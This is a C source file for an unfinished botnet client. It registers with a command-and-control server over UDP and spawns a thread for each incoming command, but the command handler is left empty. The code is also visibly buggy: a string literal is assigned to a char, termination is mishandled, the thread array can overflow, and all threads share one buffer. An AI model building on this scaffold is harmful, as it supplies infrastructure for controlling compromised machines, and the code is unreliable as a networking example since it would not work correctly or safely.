#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <getopt.h>
#include <stdbool.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <string.h>

#define MAX_THREAD_COUNT 50
#define MAX_MESSAGE_SIZE 1024

// Structure to hold the data for the thread
struct data_for_registration {
    char *server_ip;
    int server_port;
    int socket;
};

// Function that handles registration to C&C
void *send_registration_message(void *arg) {

    // Cast the argument to a pointer to the data_for_registration structure
    struct data_for_registration *server_data = (struct data_for_registration *)arg;

    // Set up the C&C server address struct
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_data->server_port);
    if (inet_pton(AF_INET, server_data->server_ip, &server_addr.sin_addr) <= 0) {
        perror("Invalid IP address");
        pthread_exit(NULL);
    }

    //Sending a message to the server
    char *registration_message = "REG\n";
    if (sendto(server_data->socket, registration_message, strlen(registration_message), 0, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Send message failed");
    } else {
        printf("Registration message sent to %s:%d\n", server_data->server_ip, server_data->server_port);
    }

    pthread_exit(NULL);
}

// Function that handles UDP messages
void *handle_UDP_message(void *arg) {

    // Cast the argument to a pointer to the char[MAX_MESSAGE_SIZE] data struct
    char *message = (char *)arg;



    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {

    // Program call options
    int opt;
    static struct option long_options[] = {
        {"help",no_argument,0,'h'},
        {"server_ip",required_argument,0,'i'},
        {"server_port",required_argument,0,'p'},
        {0,0,0,0}
    };
    int long_index = 0;
    // C&C IP and port
    char *server_ip = NULL;
    int server_port = 0;

    // Program call argument handling
    while ((opt = getopt_long(argc, argv, "hi:p:", long_options, &long_index)) != -1) {
        switch (opt) {
            case 'h':
                printf("Usage: %s [--help] [--server_ip IP_ADDRESS] [--server_port PORT]\n", argv[0]);
                exit(EXIT_SUCCESS);
            case 'i':
                server_ip = optarg;
                break;
            case 'p':
                server_port = atoi(optarg);
                break;
            default:
                fprintf(stderr, "Usage: %s [--help] [--server_ip IP_ADDRESS] [--server_port PORT]\n", argv[0]);
                exit(EXIT_FAILURE);
        }
    }

    // Checking the program call arguments
    if (server_ip == NULL || server_port == 0) {
        fprintf(stderr, "Error: --server_ip and --server_port are mandatory.\n");
        fprintf(stderr, "Usage: %s [--server_ip IP_ADDRESS] [--server_port PORT]\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    // Program run messages
    printf("--Bot started--\n");
    printf("Server IP: %s\n", server_ip);
    printf("Server Port: %d\n", server_port);

    // Create a UDP socket
    int sockfd;
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Createing a new thread to send the registration UDP message
    pthread_t thread_ids[MAX_THREAD_COUNT];
    int current_thread = 0;
    struct data_for_registration server_data;
    server_data.server_ip = server_ip;
    server_data.server_port = server_port;
    server_data.socket = sockfd;
    if (pthread_create(&thread_ids[current_thread], NULL, send_registration_message, (void *)&server_data) != 0) {
        perror("Failed to create thread");
        return 1;
    }

    // Listening for messages and handling with threads
    char message_buffer[MAX_MESSAGE_SIZE];
    while(true){
        // Receive UDP_message
        ssize_t n = recvfrom(sockfd, message_buffer, sizeof(message_buffer) - 1, 0, NULL, NULL);
        if (n < 0) {
            continue;
        }
        else{
            // Asign id to thread
            if(current_thread >= MAX_THREAD_COUNT){
                current_thread = 0;
            }
            else{
                current_thread++;
            }
            // Null terminate the string
            message_buffer[MAX_MESSAGE_SIZE-1] = "\0";
            // Handle UDP message in new thread
            if (pthread_create(&thread_ids[current_thread], NULL, handle_UDP_message, (void *)&message_buffer) != 0) {
                perror("Failed to create thread");
                return 1;
            }
        }
    }

    // Program finish
    for(int i=0; i<MAX_THREAD_COUNT; ++i){
        pthread_join(thread_ids[i], NULL);
    }
    return 0;
}
